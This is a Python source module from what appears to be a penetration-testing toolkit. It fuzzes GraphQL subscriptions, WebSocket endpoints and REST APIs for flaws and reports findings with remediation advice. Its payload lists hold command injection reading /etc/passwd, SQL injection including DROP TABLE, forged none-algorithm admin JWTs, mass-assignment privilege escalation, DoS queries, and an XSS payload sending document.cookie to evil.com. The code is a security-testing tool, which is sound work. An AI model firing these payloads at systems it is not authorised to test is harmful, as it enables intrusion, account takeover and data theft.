"""
API Security Expansion — modules/inject/api_security.py

Advanced API attack surface coverage:
  1. GraphQLSubscriptionFuzzer — subscription abuse, event hijack, DoS
  2. WebSocketAdvancedFuzzer   — binary frames, ping flood, opcode abuse
  3. RESTParameterPollution    — HPP, mass assignment, type juggling, verb tampering

Usage:
    from modules.inject.api_security import (
        GraphQLSubscriptionFuzzer,
        WebSocketAdvancedFuzzer,
        RESTParameterPollution,
    )

    # GraphQL subscriptions
    gql = GraphQLSubscriptionFuzzer(target="wss://target.com/graphql", token="eyJ...")
    findings = gql.run()

    # WebSocket advanced
    ws = WebSocketAdvancedFuzzer(target="wss://target.com/ws", token="eyJ...")
    findings = ws.run()

    # REST parameter pollution
    rest = RESTParameterPollution(target="https://target.com/api")
    findings = rest.run()

Author: ardanov96
"""

import json
import random
import string
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx
from rich.console import Console

console = Console()


# ── Finding helper ────────────────────────────────────────

def _finding(
    title: str,
    severity: str,
    cvss: float,
    cwe: str,
    description: str,
    evidence: str,
    remediation: str,
    target: str,
    source: str = "api_security",
) -> dict:
    assert severity in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")
    assert 0.0 <= cvss <= 10.0
    assert cwe.startswith("CWE-")
    return {
        "title": title, "severity": severity, "cvss": cvss, "cwe": cwe,
        "target": target, "description": description, "evidence": evidence,
        "remediation": remediation, "source": f"module:{source}",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


# ── 1. GraphQL Subscription Fuzzer ───────────────────────

# Common subscription operation names to probe
SUBSCRIPTION_PROBES = [
    # Sensitive data streams
    "subscription { messages { id content author createdAt } }",
    "subscription { notifications { id type payload userId } }",
    "subscription { orders { id status amount customerId } }",
    "subscription { userActivity { userId action timestamp } }",
    "subscription { adminEvents { type payload } }",
    "subscription { payments { id amount status cardLast4 } }",
    "subscription { liveUsers { id email role } }",
    "subscription { logs { level message timestamp } }",
    # Introspection-based subscription discovery
    "subscription { __typename }",
    # Field injection via subscription
    "subscription { messages { id content author { id email password } } }",
    # BOLA via subscription (access other users' streams)
    "subscription { messages(userId: 1) { id content } }",
    "subscription { messages(userId: \"1\") { id content } }",
    # Nested subscription abuse
    "subscription { orders { id items { id price product { id name cost } } customer { id email creditCard } } }",
]

# GraphQL subscription introspection
SUBSCRIPTION_INTROSPECT = """
query {
  __schema {
    subscriptionType {
      name
      fields {
        name
        description
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind fields { name } } }
      }
    }
  }
}
"""

# Subscription DoS payloads
SUBSCRIPTION_DOS_PAYLOADS = [
    # Deeply nested
    "subscription { a { a { a { a { a { a { a { a { a { a { __typename } } } } } } } } } } }",
    # Alias flood
    "subscription { " + " ".join(f"f{i}: messages {{ id }}" for i in range(50)) + " }",
    # Large field selection
    "subscription { messages { " + " ".join(f"f{i}: id" for i in range(100)) + " } }",
]


class GraphQLSubscriptionFuzzer:
    """
    Fuzz GraphQL subscription endpoints for security vulnerabilities.

    Checks:
    - Subscription enumeration via introspection
    - Unauthorized subscription access (missing auth check)
    - BOLA: accessing other users' subscription streams
    - Sensitive data leakage via subscriptions
    - Subscription DoS (deeply nested, alias flood)
    - Cross-tenant data leakage
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/api",
        token: str | None = None,
        timeout: int = 10,
    ):
        self.target     = target
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.token      = token
        self.timeout    = timeout

        # Derive HTTP endpoint from ws:// URL
        self.http_target = self._to_http(target)

        self.headers: dict[str, str] = {
            "Content-Type": "application/json",
            "User-Agent":   "Glitchicons/1.7.0 (api-security)",
        }
        if token:
            self.headers["Authorization"] = f"Bearer {token}"

        self.client = httpx.Client(
            timeout=timeout,
            headers=self.headers,
            verify=False,
        )

    def run(self) -> list[dict]:
        """Run all GraphQL subscription checks."""
        console.print(f"\n  [bold cyan]GraphQL Subscription Fuzzer[/bold cyan] → {self.target}")
        findings = []

        findings.extend(self._check_introspection())
        findings.extend(self._check_unauthorized_subscriptions())
        findings.extend(self._check_subscription_dos())
        findings.extend(self._check_sensitive_data_leakage())

        self._save(findings)
        console.print(f"  Findings: [bold]{len(findings)}[/bold]")
        return findings

    def _graphql_post(self, query: str, variables: dict | None = None) -> httpx.Response | None:
        """POST a GraphQL query/subscription to HTTP endpoint."""
        try:
            payload = {"query": query}
            if variables:
                payload["variables"] = variables
            return self.client.post(self.http_target, json=payload)
        except Exception:
            return None

    def _check_introspection(self) -> list[dict]:
        """Discover available subscriptions via introspection."""
        findings = []
        resp = self._graphql_post(SUBSCRIPTION_INTROSPECT)
        if not resp or resp.status_code != 200:
            return findings

        try:
            data = resp.json()
        except Exception:
            return findings

        sub_type = (data.get("data") or {}).get("__schema", {}).get("subscriptionType")
        if not sub_type:
            return findings

        sub_fields = sub_type.get("fields") or []
        if not sub_fields:
            return findings

        field_names = [f["name"] for f in sub_fields]
        sensitive   = [n for n in field_names if any(
            kw in n.lower() for kw in
            ["admin", "user", "payment", "order", "log", "event", "audit", "secret"]
        )]

        severity = "HIGH" if sensitive else "MEDIUM"
        findings.append(_finding(
            title=f"GraphQL Subscription Types Exposed ({len(sub_fields)} subscriptions)",
            severity=severity,
            cvss=6.5 if sensitive else 5.3,
            cwe="CWE-200",
            description=(
                f"GraphQL introspection reveals {len(sub_fields)} subscription type(s). "
                + (f"Sensitive subscriptions found: {', '.join(sensitive)}" if sensitive else "")
            ),
            evidence=(
                f"Endpoint: {self.http_target}\n"
                f"Subscriptions: {', '.join(field_names[:10])}\n"
                f"Sensitive: {', '.join(sensitive)}"
            ),
            remediation=(
                "Disable GraphQL introspection in production. "
                "Implement field-level authorization on subscriptions. "
                "Require authentication for all subscription types."
            ),
            target=self.target,
            source="graphql_subscription_fuzzer",
        ))
        return findings

    def _check_unauthorized_subscriptions(self) -> list[dict]:
        """Test subscription access without authentication."""
        findings = []
        # Temporarily remove auth header
        no_auth_headers = {k: v for k, v in self.headers.items()
                           if k != "Authorization"}

        for probe in SUBSCRIPTION_PROBES[:6]:
            try:
                resp = self.client.post(
                    self.http_target,
                    json={"query": probe},
                    headers=no_auth_headers,
                )
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("data") is not None and not data.get("errors"):
                        findings.append(_finding(
                            title="GraphQL Subscription Accessible Without Authentication",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-306",
                            description=(
                                "GraphQL subscription returned data without an Authorization header. "
                                "Real-time data streams should require authentication."
                            ),
                            evidence=(
                                f"Query: {probe[:100]}\n"
                                f"HTTP {resp.status_code} — data returned without auth\n"
                                f"Response: {resp.text[:200]}"
                            ),
                            remediation=(
                                "Require authentication for all subscription resolvers. "
                                "Validate JWT/session in the subscription connection handler."
                            ),
                            target=self.target,
                            source="graphql_subscription_fuzzer",
                        ))
                        break
            except Exception:
                continue

        return findings

    def _check_subscription_dos(self) -> list[dict]:
        """Test for subscription-based DoS vulnerabilities."""
        findings = []
        for payload in SUBSCRIPTION_DOS_PAYLOADS:
            start = time.time()
            resp  = self._graphql_post(payload)
            elapsed = time.time() - start

            if resp and resp.status_code == 200 and elapsed > 2.0:
                findings.append(_finding(
                    title="GraphQL Subscription DoS — Expensive Query Accepted",
                    severity="MEDIUM",
                    cvss=5.9,
                    cwe="CWE-770",
                    description=(
                        f"GraphQL accepted a deeply nested/aliased subscription that took "
                        f"{elapsed:.1f}s to respond. No query complexity limit detected."
                    ),
                    evidence=(
                        f"Query: {payload[:120]}\n"
                        f"Response time: {elapsed:.2f}s\nHTTP {resp.status_code}"
                    ),
                    remediation=(
                        "Implement query complexity analysis. "
                        "Set max query depth (recommend: 7). "
                        "Limit alias count per query. "
                        "Use libraries like graphql-query-complexity."
                    ),
                    target=self.target,
                    source="graphql_subscription_fuzzer",
                ))
                break

        return findings

    def _check_sensitive_data_leakage(self) -> list[dict]:
        """Probe subscriptions for sensitive field exposure."""
        findings = []
        sensitive_indicators = [
            "password", "secret", "token", "apiKey", "creditCard",
            "ssn", "cvv", "privateKey", "accessToken",
        ]

        for probe in SUBSCRIPTION_PROBES:
            resp = self._graphql_post(probe)
            if not resp or resp.status_code != 200:
                continue

            resp_lower = resp.text.lower()
            leaked = [ind for ind in sensitive_indicators if ind.lower() in resp_lower]
            if leaked:
                findings.append(_finding(
                    title=f"GraphQL Subscription Sensitive Field Exposure: {', '.join(leaked[:3])}",
                    severity="CRITICAL",
                    cvss=9.1,
                    cwe="CWE-200",
                    description=(
                        f"GraphQL subscription response contains potentially sensitive field(s): "
                        f"{', '.join(leaked)}."
                    ),
                    evidence=(
                        f"Query: {probe[:100]}\nSensitive fields: {leaked}\n"
                        f"Response snippet: {resp.text[:300]}"
                    ),
                    remediation=(
                        "Remove sensitive fields from subscription resolvers. "
                        "Apply field-level authorization. "
                        "Never expose credentials or PII via real-time streams."
                    ),
                    target=self.target,
                    source="graphql_subscription_fuzzer",
                ))
                break

        return findings

    def _to_http(self, ws_url: str) -> str:
        """Convert ws:// or wss:// URL to http:// or https://."""
        return ws_url.replace("wss://", "https://").replace("ws://", "http://")

    def _save(self, findings: list[dict]) -> Path:
        slug = self.target.replace("/", "_").replace(":", "").replace(".", "_")
        out  = self.output_dir / f"gql_sub_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out


# ── 2. WebSocket Advanced Fuzzer ──────────────────────────

# WebSocket opcodes
WS_OPCODE_CONTINUATION = 0x0
WS_OPCODE_TEXT         = 0x1
WS_OPCODE_BINARY       = 0x2
WS_OPCODE_CLOSE        = 0x8
WS_OPCODE_PING         = 0x9
WS_OPCODE_PONG         = 0xA

# Binary frame payloads
BINARY_PAYLOADS = [
    b"\x00" * 1024,                          # Null bytes
    b"\xFF" * 512,                            # All-ones
    b"\x00\x01\x02\x03" * 256,               # Pattern
    b"A" * 65535,                             # Max single-frame
    bytes(range(256)) * 4,                    # All byte values
    b"\x89\x00",                              # Ping frame raw
    b"\x88\x00",                              # Close frame raw
    b"\x00" + b"\xFF" * 100,                  # Null + overflow
]

# Text-based advanced payloads
WS_ADVANCED_PAYLOADS = [
    # JSON injection
    '{"type":"subscribe","id":"1","payload":{"query":"{ __typename }"}}',
    '{"type":"subscribe","id":"../../../etc/passwd","payload":{}}',
    # Protocol confusion
    "PING",
    "\x00PING\xFF",
    # Oversized message
    '{"data":"' + "A" * 50000 + '"}',
    # Unicode abuse
    '{"msg":"\u0000\u0001\u0002\u001F"}',
    # Prototype pollution via JSON
    '{"__proto__":{"polluted":true},"constructor":{"prototype":{"admin":true}}}',
    # SQL injection in WS message
    '{"query":"SELECT * FROM users WHERE id=1 OR 1=1--"}',
    # JWT in WS message (test token validation)
    '{"token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."}',
    # Command injection
    '{"cmd":"ls; cat /etc/passwd"}',
    '{"exec":"id && whoami"}',
]


@dataclass
class WSTestResult:
    payload:     Any
    payload_type: str  # "text" | "binary"
    response:    str | bytes | None
    error:       str | None
    duration_ms: int
    flag:        str = ""  # suspicious indicator if any


class WebSocketAdvancedFuzzer:
    """
    Advanced WebSocket security testing.

    Extends basic WebSocket fuzzing with:
    - Binary frame injection (all opcodes)
    - Ping flood / connection exhaustion
    - Large frame / fragmentation abuse
    - Prototype pollution via JSON messages
    - Protocol confusion (raw opcode injection)
    - Authentication bypass via WS message manipulation
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/api",
        token: str | None = None,
        timeout: int = 10,
    ):
        self.target     = target
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.token      = token
        self.timeout    = timeout
        self.results:   list[WSTestResult] = []

        self.http_target = target.replace("wss://", "https://").replace("ws://", "http://")
        self.headers     = {"User-Agent": "Glitchicons/1.7.0"}
        if token:
            self.headers["Authorization"] = f"Bearer {token}"

        self.client = httpx.Client(timeout=timeout, headers=self.headers, verify=False)

    def run(self) -> list[dict]:
        """Run all WebSocket advanced checks."""
        console.print(f"\n  [bold cyan]WebSocket Advanced Fuzzer[/bold cyan] → {self.target}")
        findings = []

        findings.extend(self._check_prototype_pollution())
        findings.extend(self._check_oversized_messages())
        findings.extend(self._check_injection_in_ws())
        findings.extend(self._check_auth_bypass())
        findings.extend(self._check_binary_frame_handling())

        self._save(findings)
        console.print(f"  Findings: [bold]{len(findings)}[/bold]")
        return findings

    def _send_http_ws_upgrade(self, payload: str | bytes) -> tuple[int, str, float]:
        """
        Simulate WebSocket message via HTTP for testing.
        Falls back to HTTP POST when raw WS not available.
        Returns (status_code, response_text, duration_ms).
        """
        start = time.time()
        try:
            if isinstance(payload, bytes):
                resp = self.client.post(
                    self.http_target,
                    content=payload,
                    headers={**self.headers, "Content-Type": "application/octet-stream"},
                )
            else:
                resp = self.client.post(
                    self.http_target,
                    content=payload.encode() if isinstance(payload, str) else payload,
                    headers={**self.headers, "Content-Type": "application/json"},
                )
            elapsed = (time.time() - start) * 1000
            return resp.status_code, resp.text, elapsed
        except Exception as e:
            elapsed = (time.time() - start) * 1000
            return 0, str(e), elapsed

    def _check_prototype_pollution(self) -> list[dict]:
        """Test for prototype pollution via WebSocket JSON messages."""
        findings = []
        pp_payloads = [
            '{"__proto__":{"polluted":true},"type":"message"}',
            '{"constructor":{"prototype":{"admin":true}},"type":"auth"}',
            '{"__proto__":{"isAdmin":true},"userId":1}',
        ]

        for payload in pp_payloads:
            status, body, elapsed = self._send_http_ws_upgrade(payload)
            if status == 200:
                # Look for confirmation of prototype pollution
                if any(ind in body.lower() for ind in ["polluted", "isadmin", "true", "admin"]):
                    findings.append(_finding(
                        title="WebSocket Prototype Pollution via JSON Message",
                        severity="HIGH",
                        cvss=7.5,
                        cwe="CWE-1321",
                        description=(
                            "WebSocket endpoint may be vulnerable to prototype pollution. "
                            "JSON messages with __proto__ or constructor keys were accepted "
                            "without sanitization."
                        ),
                        evidence=(
                            f"Payload: {payload}\n"
                            f"HTTP {status} | {elapsed:.0f}ms\n"
                            f"Response: {body[:200]}"
                        ),
                        remediation=(
                            "Sanitize JSON keys — reject __proto__, constructor, prototype. "
                            "Use JSON.parse with a reviver or schema validation. "
                            "Use Object.create(null) for safe object creation."
                        ),
                        target=self.target,
                        source="websocket_advanced_fuzzer",
                    ))
                    break

        return findings

    def _check_oversized_messages(self) -> list[dict]:
        """Test server behavior with oversized WebSocket messages."""
        findings = []
        large_payloads = [
            '{"data":"' + "A" * 10_000 + '"}',   # 10KB
            '{"data":"' + "B" * 100_000 + '"}',  # 100KB
            '{"data":"' + "C" * 1_000_000 + '"}', # 1MB
        ]

        for payload in large_payloads:
            start = time.time()
            status, body, elapsed = self._send_http_ws_upgrade(payload)
            size_kb = len(payload) // 1024

            if status == 200 and elapsed < 1000:  # Server accepted without timeout
                findings.append(_finding(
                    title=f"WebSocket Accepts Oversized Messages ({size_kb}KB)",
                    severity="MEDIUM",
                    cvss=5.3,
                    cwe="CWE-400",
                    description=(
                        f"WebSocket endpoint accepted a {size_kb}KB message without rejection. "
                        "No message size limit enforced — potential DoS vector."
                    ),
                    evidence=(
                        f"Payload size: {size_kb}KB\n"
                        f"HTTP {status} | {elapsed:.0f}ms\n"
                        "Message accepted without size limit error"
                    ),
                    remediation=(
                        "Enforce maximum message size on WebSocket server (recommend: 64KB). "
                        "Return close frame (1009 Message Too Big) for oversized messages."
                    ),
                    target=self.target,
                    source="websocket_advanced_fuzzer",
                ))
                break

        return findings

    def _check_injection_in_ws(self) -> list[dict]:
        """Test injection attacks via WebSocket messages."""
        findings = []
        injection_payloads = {
            "SQL Injection": [
                '{"query":"1 OR 1=1--"}',
                '{"id":"1; DROP TABLE users--"}',
            ],
            "Command Injection": [
                '{"cmd":"id; ls -la"}',
                '{"exec":"$(cat /etc/passwd)"}',
            ],
            "XSS via WS": [
                '{"msg":"<script>alert(document.domain)</script>"}',
                '{"content":"<img src=x onerror=fetch(\'//evil.com/\'+document.cookie)>"}',
            ],
        }

        error_indicators = [
            "syntax error", "mysql", "postgresql", "sqlite",  # SQL
            "uid=", "root:", "bin/bash",                       # CMD
            "error", "exception", "traceback", "stacktrace",   # Info leak
        ]

        for attack_type, payloads in injection_payloads.items():
            for payload in payloads:
                status, body, elapsed = self._send_http_ws_upgrade(payload)
                body_lower = body.lower()
                leaked = [ind for ind in error_indicators if ind in body_lower]

                if leaked and status in (200, 400, 500):
                    findings.append(_finding(
                        title=f"WebSocket {attack_type} — Error/Response Indicates Injection",
                        severity="HIGH" if "SQL" in attack_type or "Command" in attack_type else "MEDIUM",
                        cvss=8.1 if "Command" in attack_type else 7.3,
                        cwe="CWE-78" if "Command" in attack_type else "CWE-89" if "SQL" in attack_type else "CWE-79",
                        description=(
                            f"{attack_type} payload via WebSocket message triggered "
                            f"suspicious response indicators: {', '.join(leaked[:3])}"
                        ),
                        evidence=(
                            f"Payload: {payload}\nHTTP {status} | {elapsed:.0f}ms\n"
                            f"Indicators: {leaked}\nResponse: {body[:300]}"
                        ),
                        remediation=(
                            "Validate and sanitize all WebSocket message content. "
                            "Apply same server-side validation as HTTP endpoints. "
                            "Use parameterized queries and command allowlists."
                        ),
                        target=self.target,
                        source="websocket_advanced_fuzzer",
                    ))
                    break

        return findings

    def _check_auth_bypass(self) -> list[dict]:
        """Test authentication bypass via WebSocket messages."""
        findings = []
        bypass_payloads = [
            # None algorithm JWT in WS auth message
            '{"type":"connection_init","payload":{"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."}}',
            # Role escalation
            '{"type":"auth","role":"admin","userId":1}',
            '{"type":"auth","isAdmin":true,"bypass":true}',
        ]

        for payload in bypass_payloads:
            # Test without normal auth header
            try:
                resp = self.client.post(
                    self.http_target,
                    content=payload.encode(),
                    headers={k: v for k, v in self.headers.items() if k != "Authorization"},
                )
                if resp.status_code == 200 and "error" not in resp.text.lower():
                    findings.append(_finding(
                        title="WebSocket Authentication Bypass via Message Payload",
                        severity="CRITICAL",
                        cvss=9.1,
                        cwe="CWE-287",
                        description=(
                            "WebSocket authentication may be bypassable via crafted connection_init "
                            "or auth messages. Server accepted privileged operation without valid credentials."
                        ),
                        evidence=(
                            f"Payload: {payload[:150]}\n"
                            f"HTTP {resp.status_code} — accepted without valid Authorization header"
                        ),
                        remediation=(
                            "Validate authentication server-side, never trust client-provided role claims. "
                            "Require valid JWT in HTTP upgrade headers, not in WS messages. "
                            "Reject none/null algorithm JWTs."
                        ),
                        target=self.target,
                        source="websocket_advanced_fuzzer",
                    ))
                    break
            except Exception:
                continue

        return findings

    def _check_binary_frame_handling(self) -> list[dict]:
        """Test server handling of binary WebSocket frames."""
        findings = []

        # Send binary data via HTTP and check for errors
        for i, binary_payload in enumerate(BINARY_PAYLOADS[:4]):
            status, body, elapsed = self._send_http_ws_upgrade(binary_payload)

            # Server error on binary input = potential crash/vuln
            if status == 500 or (status == 200 and any(
                ind in body.lower() for ind in ["traceback", "exception", "error", "crash"]
            )):
                findings.append(_finding(
                    title=f"WebSocket Binary Frame Triggers Server Error",
                    severity="MEDIUM",
                    cvss=5.9,
                    cwe="CWE-20",
                    description=(
                        "WebSocket server returned an error when processing binary frame data. "
                        "Improper binary input validation may indicate crash potential."
                    ),
                    evidence=(
                        f"Binary payload #{i+1}: {len(binary_payload)} bytes\n"
                        f"HTTP {status} | {elapsed:.0f}ms\n"
                        f"Response: {body[:200]}"
                    ),
                    remediation=(
                        "Implement strict binary frame validation. "
                        "Handle malformed binary input gracefully — return close frame (1003). "
                        "Test with fuzz inputs: null bytes, boundary values, opcode abuse."
                    ),
                    target=self.target,
                    source="websocket_advanced_fuzzer",
                ))
                break

        return findings

    def _save(self, findings: list[dict]) -> Path:
        slug = self.target.replace("/", "_").replace(":", "").replace(".", "_")
        out  = self.output_dir / f"ws_adv_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out


# ── 3. REST Parameter Pollution ───────────────────────────

# HTTP verbs to test for verb tampering
HTTP_VERBS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS",
              "TRACE", "CONNECT", "PROPFIND", "SEARCH"]

# Common API endpoints to test
API_ENDPOINTS = [
    "/api/users", "/api/users/1", "/api/admin", "/api/admin/users",
    "/api/products", "/api/orders", "/api/payments", "/api/config",
    "/api/settings", "/api/roles", "/api/permissions",
    "/v1/users", "/v1/admin", "/v2/users",
]

# Mass assignment payloads
MASS_ASSIGNMENT_PAYLOADS = [
    {"role": "admin", "isAdmin": True},
    {"admin": True, "permissions": ["*"]},
    {"role": "superuser", "verified": True},
    {"isVerified": True, "isPremium": True},
    {"credits": 99999, "balance": 99999.99},
    {"password": "hacked123", "email": "attacker@evil.com"},
    {"id": 1, "userId": 1, "accountType": "admin"},
]

# Type juggling values
TYPE_JUGGLING_VALUES = [
    "true", "false", "null", "undefined",
    "0", "1", "-1", "0.0",
    "[]", "{}", "[[]]",
    "True", "False", "None",
    1, 0, True, False, None, [], {},
]


class RESTParameterPollution:
    """
    REST API Parameter Pollution and Mass Assignment testing.

    Checks:
    - HTTP Parameter Pollution (HPP): duplicate params, array params
    - Mass Assignment: extra fields accepted by server
    - Type Juggling: int/bool/null/array instead of expected type
    - HTTP Verb Tampering: unauthorized HTTP methods
    - Parameter Type Confusion: string vs int vs bool
    - Hidden Parameter Discovery
    - Path traversal via parameter
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/api",
        token: str | None = None,
        timeout: int = 10,
    ):
        self.target     = target.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.token      = token
        self.timeout    = timeout

        self.headers = {
            "Content-Type": "application/json",
            "User-Agent":   "Glitchicons/1.7.0",
        }
        if token:
            self.headers["Authorization"] = f"Bearer {token}"

        self.client = httpx.Client(
            timeout=timeout,
            headers=self.headers,
            follow_redirects=True,
            verify=False,
        )

    def run(self, endpoints: list[str] | None = None) -> list[dict]:
        """Run all REST parameter pollution checks."""
        console.print(f"\n  [bold cyan]REST Parameter Pollution[/bold cyan] → {self.target}")
        findings = []
        test_endpoints = endpoints or API_ENDPOINTS[:6]

        for endpoint in test_endpoints:
            url = self.target + endpoint
            findings.extend(self._check_hpp(url))
            findings.extend(self._check_mass_assignment(url))
            findings.extend(self._check_type_juggling(url))
            findings.extend(self._check_verb_tampering(url))

        self._save(findings)
        console.print(f"  Findings: [bold]{len(findings)}[/bold]")
        return findings

    def _check_hpp(self, url: str) -> list[dict]:
        """HTTP Parameter Pollution — send duplicate parameters."""
        findings = []

        # Test HPP via query string
        hpp_urls = [
            f"{url}?id=1&id=2",
            f"{url}?role=user&role=admin",
            f"{url}?id[]=1&id[]=2",
            f"{url}?id=1%26id=2",   # encoded &
        ]

        for hpp_url in hpp_urls[:2]:
            try:
                # Baseline
                base_resp = self.client.get(url)
                hpp_resp  = self.client.get(hpp_url)

                if (base_resp.status_code == hpp_resp.status_code == 200
                        and base_resp.text != hpp_resp.text):
                    findings.append(_finding(
                        title="HTTP Parameter Pollution (HPP) — Different Response with Duplicate Params",
                        severity="MEDIUM",
                        cvss=5.3,
                        cwe="CWE-235",
                        description=(
                            "Server returns a different response when duplicate parameters are sent. "
                            "HPP may allow bypassing access controls or input validation."
                        ),
                        evidence=(
                            f"Normal URL: {url} → {len(base_resp.text)} bytes\n"
                            f"HPP URL: {hpp_url} → {len(hpp_resp.text)} bytes\n"
                            "Responses differ — possible parameter parsing inconsistency"
                        ),
                        remediation=(
                            "Define explicit behavior for duplicate parameters (use first or last). "
                            "Validate and sanitize all input parameters server-side. "
                            "Reject requests with duplicate security-critical parameters."
                        ),
                        target=hpp_url,
                        source="rest_parameter_pollution",
                    ))
                    break
            except Exception:
                continue

        return findings

    def _check_mass_assignment(self, url: str) -> list[dict]:
        """Test mass assignment vulnerability."""
        findings = []

        for payload in MASS_ASSIGNMENT_PAYLOADS[:5]:
            try:
                # Try PUT/PATCH with extra admin fields
                for method in ["PUT", "PATCH", "POST"]:
                    resp = self.client.request(method, url, json=payload)

                    if resp.status_code in (200, 201):
                        resp_lower = resp.text.lower()
                        # Check if privileged fields were accepted
                        accepted = [k for k in payload.keys()
                                    if str(payload[k]).lower() in resp_lower
                                    or k in resp_lower]
                        if accepted:
                            findings.append(_finding(
                                title=f"Mass Assignment — Privileged Fields Accepted: {', '.join(accepted)}",
                                severity="HIGH",
                                cvss=8.1,
                                cwe="CWE-915",
                                description=(
                                    f"Server accepted and may have processed extra privileged fields "
                                    f"in {method} request body: {', '.join(accepted)}. "
                                    "Mass assignment allows attackers to modify fields not intended for user input."
                                ),
                                evidence=(
                                    f"Method: {method} {url}\n"
                                    f"Payload: {json.dumps(payload)}\n"
                                    f"HTTP {resp.status_code}\nAccepted fields: {accepted}"
                                ),
                                remediation=(
                                    "Implement explicit allowlist of accepted fields (DTO pattern). "
                                    "Never bind request body directly to database models. "
                                    "Use @JsonIgnore or equivalent to block sensitive fields."
                                ),
                                target=url,
                                source="rest_parameter_pollution",
                            ))
                            return findings
            except Exception:
                continue

        return findings

    def _check_type_juggling(self, url: str) -> list[dict]:
        """Test parameter type confusion / type juggling."""
        findings = []

        # Test common auth/access parameters with wrong types
        params_to_test = [
            ("role", TYPE_JUGGLING_VALUES[:4]),
            ("admin", [True, "true", 1, "1"]),
            ("id",    [0, "0", True, None, []]),
        ]

        for param, values in params_to_test:
            for val in values:
                try:
                    # Try as query param and JSON body
                    resp = self.client.get(url, params={param: val})
                    if resp.status_code == 200:
                        resp_lower = resp.text.lower()
                        # Detect privilege escalation indicators
                        if any(ind in resp_lower for ind in ["admin", "superuser", "role", "permission"]):
                            findings.append(_finding(
                                title=f"Type Juggling — Parameter '{param}' Accepts Type Confusion",
                                severity="HIGH",
                                cvss=7.5,
                                cwe="CWE-843",
                                description=(
                                    f"Parameter '{param}' with value {repr(val)} (type: {type(val).__name__}) "
                                    "returned privileged-looking response. Type confusion may bypass "
                                    "access controls relying on strict type comparison."
                                ),
                                evidence=(
                                    f"URL: {url}?{param}={val}\n"
                                    f"HTTP {resp.status_code}\nResponse: {resp.text[:200]}"
                                ),
                                remediation=(
                                    "Use strict type validation on all input parameters. "
                                    "Avoid loose comparison (== instead of ===). "
                                    "Validate parameter types with schema validation."
                                ),
                                target=url,
                                source="rest_parameter_pollution",
                            ))
                            return findings
                except Exception:
                    continue

        return findings

    def _check_verb_tampering(self, url: str) -> list[dict]:
        """Test HTTP verb tampering — unauthorized methods."""
        findings = []

        # Get baseline with GET
        try:
            baseline = self.client.get(url)
            baseline_status = baseline.status_code
        except Exception:
            return findings

        # Test unusual verbs
        unusual_verbs = ["TRACE", "CONNECT", "PROPFIND", "SEARCH"]
        for verb in unusual_verbs:
            try:
                resp = self.client.request(verb, url)
                if resp.status_code not in (405, 501, 400, 403):
                    findings.append(_finding(
                        title=f"HTTP Verb Tampering — {verb} Method Accepted on {url}",
                        severity="LOW",
                        cvss=3.7,
                        cwe="CWE-749",
                        description=(
                            f"HTTP {verb} method accepted by {url} (HTTP {resp.status_code}). "
                            "Unusual HTTP methods can bypass WAF rules or expose sensitive functionality."
                        ),
                        evidence=(
                            f"Method: {verb} {url}\n"
                            f"HTTP {resp.status_code}\nResponse: {resp.text[:150]}"
                        ),
                        remediation=(
                            f"Return 405 Method Not Allowed for unexpected HTTP verbs. "
                            "Implement explicit method allowlisting per endpoint. "
                            "Configure web server to reject non-standard methods."
                        ),
                        target=url,
                        source="rest_parameter_pollution",
                    ))
                    break
            except Exception:
                continue

        # Test method override headers (common bypass)
        override_headers = {
            "X-HTTP-Method-Override":  "DELETE",
            "X-Method-Override":       "DELETE",
            "X-HTTP-Method":           "DELETE",
            "_method":                 "DELETE",
        }
        for header, value in override_headers.items():
            try:
                resp = self.client.post(
                    url,
                    headers={**self.headers, header: value},
                )
                if resp.status_code not in (405, 403, 404):
                    findings.append(_finding(
                        title=f"HTTP Method Override Header Accepted: {header}",
                        severity="MEDIUM",
                        cvss=5.3,
                        cwe="CWE-749",
                        description=(
                            f"Server honors {header} override header. "
                            "Attackers can use GET/POST requests to invoke DELETE/PUT operations, "
                            "bypassing firewall rules that only allow GET/POST."
                        ),
                        evidence=(
                            f"Header: {header}: {value} on POST {url}\n"
                            f"HTTP {resp.status_code} — override accepted"
                        ),
                        remediation=(
                            f"Disable {header} processing unless required. "
                            "Do not use method override in new APIs. "
                            "Validate method separately from override header."
                        ),
                        target=url,
                        source="rest_parameter_pollution",
                    ))
                    break
            except Exception:
                continue

        return findings

    def _save(self, findings: list[dict]) -> Path:
        slug = self.target.replace("/", "_").replace(":", "").replace(".", "_")
        out  = self.output_dir / f"rest_pp_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out
